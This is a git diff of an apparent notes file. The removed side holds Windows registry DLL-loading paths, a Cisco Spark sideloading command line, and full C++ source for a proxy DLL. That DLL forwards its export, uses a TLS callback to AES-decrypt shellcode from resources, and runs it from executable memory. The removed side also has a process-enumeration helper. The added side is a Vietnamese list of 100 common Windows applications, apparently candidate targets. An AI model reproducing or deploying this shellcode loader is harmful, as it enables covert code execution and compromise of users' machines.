@@ -1,225 +1,221 @@
-# helloo
-
-
 ```
-HKLM\SOFTWARE\Microsoft\Rpc\Extensions\NdrOleExtDLL  
-HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\AutodialDLL
+🖥️ Trình duyệt Web (1–10)
 
+    Google Chrome
 
-HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Callout
+    Microsoft Edge
 
-HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000001\LibraryPath
+    Mozilla Firefox
 
-%SystemRoot%\system32\napinsp.dll
+    Opera
 
+    Brave
 
-HKLM\System\CurrentControlSet\Services\afunix\Parameters\Winsock\HelperDllName
+    Vivaldi
 
-HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\PolicyExtensions
+    Chromium
 
-HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\PolicyExtensions
+    Safari (Windows legacy)
 
+    Tor Browser
 
+    Epic Privacy Browser
 
+🧰 Office & PDF (11–20)
 
-HKLM\System\CurrentControlSet\Control\SecurityProviders\SecurityProviders
+    Microsoft Word
 
-HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CertDllOpenStoreProv\#16
+    Microsoft Excel
 
-HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CertDllOpenStoreProv\Ldap
+    Microsoft PowerPoint
 
-HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\IconServiceLib
+    Microsoft Outlook
 
-HKLM\System\CurrentControlSet\Control\DevQuery\8\DllName
+    WPS Office (Writer, Spreadsheets, Presentation)
 
-Command line:	"C:\Program Files\DisplayFusion\DisplayFusionHookApp64.exe" "16204" "854308" "133716" "263438" "65764" "65782" "01979e14-4c15-759a-8723-ecbf4bd5575c" "C:\Program Files\DisplayFusion\Hooks\AppHook64_34BEB801-B89B-4098-B87D-033C699DC5EB.dll" "DisplayFusion" "Software\Binary Fortress Software\DisplayFusion" "Software\Binary Fortress Software\DisplayFusion\Session\3" "1" "110" "1" "1"
+    LibreOffice (Writer, Calc, Impress)
 
-HKLM\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Windows.UI.Core.CoreWindow\DllPath
-```
-```
-"C:\Users\windef\AppData\Local\Programs\Cisco Spark\CiscoCollabHost.exe" "C:\Users\windef\AppData\Local\Programs\Cisco Spark" spark-windows-app.dll /Hosted=true "C:\Users\windef\AppData\Local\Programs\Cisco Spark\CiscoCollabHost.exe"
+    OpenOffice
 
-```
-```
-#include "pch.h"
-#include <windows.h>
-#include <iostream>
-#include <bcrypt.h>
-#include "resource.h"
+    Adobe Reader
 
-#pragma comment(lib, "bcrypt.lib")
+    Adobe Acrobat Pro
 
-#pragma comment(linker, "/export:SparkEntryPoint=spark-windows-appp.SparkEntryPoint")
+    Foxit Reader / Editor
 
+📞 Họp trực tuyến & Messaging (21–30)
 
-HMODULE g_hModule = NULL;
+    Zoom
 
-PUCHAR AESDecrypt(BYTE* data, DWORD size, BYTE* keyss, DWORD sizeKey, DWORD& outSize) {
-    BCRYPT_ALG_HANDLE hAlg = nullptr;
-    BCRYPT_KEY_HANDLE hKey = nullptr;
-    PUCHAR pbKeyObj = nullptr, pbOut = nullptr;
-    DWORD cbKeyObj = 0, cbRes = 0;
+    Microsoft Teams
 
-    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
-        return nullptr;
+    Cisco WebEx
 
-    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
-        sizeof(BCRYPT_CHAIN_MODE_CBC), 0)))
-        goto cleanup;
+    Skype (desktop)
 
-    if (!BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj,
-        sizeof(cbKeyObj), &cbRes, 0)))
-        goto cleanup;
+    Slack
 
-    pbKeyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
-    if (!pbKeyObj) goto cleanup;
+    Discord
 
-    if (!BCRYPT_SUCCESS(BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey,
-        pbKeyObj, cbKeyObj, keyss, sizeKey, 0)))
-        goto cleanup;
+    Google Meet (qua Chrome…)
 
-    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, data, size, NULL, NULL, 0,
-        NULL, 0, &outSize, BCRYPT_BLOCK_PADDING)))
-        goto cleanup;
+    Jitsi Meet (desktop)
 
-    pbOut = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, outSize);
-    if (!pbOut) goto cleanup;
+    Chanty
 
-    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, data, size, NULL, NULL, 0,
-        pbOut, outSize, &outSize, BCRYPT_BLOCK_PADDING))) {
-        HeapFree(GetProcessHeap(), 0, pbOut);
-        pbOut = nullptr;
-    }
+    GoToMeeting
 
-cleanup:
-    if (hKey) BCryptDestroyKey(hKey);
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
-    if (pbKeyObj) HeapFree(GetProcessHeap(), 0, pbKeyObj);
-    return pbOut;
-}
+🛡️ Antivirus & Bảo mật (31–40)
 
+    Windows Defender
 
-void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved);
-#pragma comment (linker, "/INCLUDE:_tls_used")
-#pragma comment (linker, "/INCLUDE:_tls_callback")
-#pragma const_seg(".CRT$XLB")
-EXTERN_C const PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks;
-#pragma const_seg()
+    Kaspersky Internet Security
 
-void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
-{
-    static bool once = false;
-    if (!once && dwReason == DLL_PROCESS_ATTACH) {
-        once = true;
-        MessageBoxW(NULL, L"TLS Callback before main :)", L"dZkyXj - Debugger Owned!", MB_OK);
-        
+    Avast / AVG
 
-        HMODULE hMod = (HMODULE)DllHandle;
+    Bitdefender
 
-        HRSRC hRsrc = FindResourceW(hMod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
-        if (!hRsrc) return;
+    Norton / Symantec
 
-        HGLOBAL hGRsrc = LoadResource(hMod, hRsrc);
-        if (!hGRsrc) return;
+    McAfee
 
-        BYTE* pData = (BYTE*)LockResource(hGRsrc);
-        DWORD dwSize = SizeofResource(hMod, hRsrc);
-        if (!pData || !dwSize) return;
+    ESET Smart Security
 
-        HRSRC hRsrc1 = FindResourceW(hMod, MAKEINTRESOURCE(IDR_RCDATA2), RT_RCDATA);
-        if (!hRsrc1) return;
+    Malwarebytes
 
-        HGLOBAL hGRsrc1 = LoadResource(hMod, hRsrc1);
-        if (!hGRsrc1) return;
+    Sophos
 
-        BYTE* pData1 = (BYTE*)LockResource(hGRsrc1);
-        DWORD dwSize1 = SizeofResource(hMod, hRsrc1);
-        if (!pData1 || !dwSize1) return;
+    CrowdStrike Falcon
 
-        BYTE* keyss = (BYTE*)HeapAlloc(GetProcessHeap(), 0, dwSize1);
-        if (!keyss) return;
-        memcpy(keyss, pData1, dwSize1);
+🧑‍💻 Developer Tools & IDE (41–55)
 
-        DWORD outSize = 0;
-        BYTE* decrypted = AESDecrypt(pData, dwSize, keyss, dwSize1, outSize);
+    Visual Studio
 
-        HeapFree(GetProcessHeap(), 0, keyss);
+    Visual Studio Code
 
-        if (decrypted) {
-            MessageBoxW(NULL, L"Shell decrypted OK", L"Debug", MB_OK);
+    IntelliJ IDEA
 
-            LPVOID shell = VirtualAlloc(NULL, outSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            if (shell) {
-                
+    PyCharm
 
-                memcpy(shell, decrypted, outSize);
+    WebStorm
 
-                //wchar_t msg[256];
-                //swprintf(msg, 256, L"[DEBUG] Shellcode allocated at: 0x%p", shell);
-                //MessageBoxW(NULL, msg, L"Shellcode Debug", MB_OK);
-                HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shell, NULL, 0, NULL);
-                if (hThread) CloseHandle(hThread);
-            }
-            HeapFree(GetProcessHeap(), 0, decrypted);
-        }
+    Eclipse
 
-    }
-}
+    Android Studio
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
-{
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
-}
-```
+    NetBeans
 
-```
-#include <windows.h>
-#include <tlhelp32.h>
-#include <tchar.h>
-#include <iostream>
-#include <string>
+    Qt Creator
 
-void FindProcessesLoadingDLL(const std::wstring& dllName)
-{
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return;
+    Android Emulator (AVD)
 
-    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
+    Docker Desktop
 
-    if (Process32First(hSnapshot, &pe32)) {
-        do {
-            HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
-            if (hModuleSnap == INVALID_HANDLE_VALUE) continue;
+    WSL (Windows Subsystem for Linux)
 
-            MODULEENTRY32 me32 = { sizeof(MODULEENTRY32) };
-            if (Module32First(hModuleSnap, &me32)) {
-                do {
-                    std::wstring moduleName(me32.szModule);
-                    if (_wcsicmp(moduleName.c_str(), dllName.c_str()) == 0) {
-                        std::wcout << L"[+] Process " << pe32.szExeFile << L" (PID: " << pe32.th32ProcessID << L") has loaded " << dllName << std::endl;
-                    }
-                } while (Module32Next(hModuleSnap, &me32));
-            }
-            CloseHandle(hModuleSnap);
-        } while (Process32Next(hSnapshot, &pe32));
-    }
+    Minikube
 
-    CloseHandle(hSnapshot);
-}
+    GitHub Desktop
 
-int wmain()
-{
-    std::wstring dllToFind = L"rasadhlp.dll"; // hoặc L"AutodialDLL.dll" nếu bạn có tên chính xác
-    FindProcessesLoadingDLL(dllToFind);
-    return 0;
-}
+    Sourcetree
 
+🎮 Game Launcher & Game Platforms (56–65)
+
+    Steam
+
+    Epic Games Launcher
+
+    Battle.net
+
+    GOG Galaxy
+
+    Origin (EA)
+
+    Uplay / Ubisoft Connect
+
+    Riot Client (League of Legends, Valorant)
+
+    Rockstar Launcher
+
+    Xbox App (Windows)
+
+    Cortex (Nvidia GeForce Experience)
+
+🖥️ Tiện ích Desktop & Hệ thống (66–75)
+
+    DisplayFusion
+
+    Rainmeter
+
+    PowerToys
+
+    Wallpaper Engine
+
+    F.lux
+
+    ShareX
+
+    Everything (voidtools)
+
+    WizTree
+
+    Process Explorer
+
+    TreeSize Free/Pro
+
+🧱 Ảo hóa & Emulation (76–84)
+
+    VMware Workstation / Player
+
+    VirtualBox
+
+    Hyper‑V Manager
+
+    Parallels Desktop (thoát Windows)
+
+    BlueStacks
+
+    NoxPlayer
+
+    LDPlayer
+
+    Genymotion
+
+    QEMU
+
+🎧 Media & Streaming (85–93)
+
+    VLC Media Player
+
+    Spotify (desktop)
+
+    iTunes / Apple Music
+
+    Plex Media Server
+
+    Kodi (XBMC)
+
+    Adobe Creative Cloud (launcher + updater)
+
+    OBS Studio
+
+    Streamlabs OBS
+
+    NVIDIA Broadcast
+
+🔧 Utilities & Tools khác (94–100)
+
+    7‑Zip
+
+    WinRAR
+
+    TeamViewer
+
+    AnyDesk
+
+    RoboForm
+
+    LastPass (app)
+
+    Chocolatey (package manager)
 ```
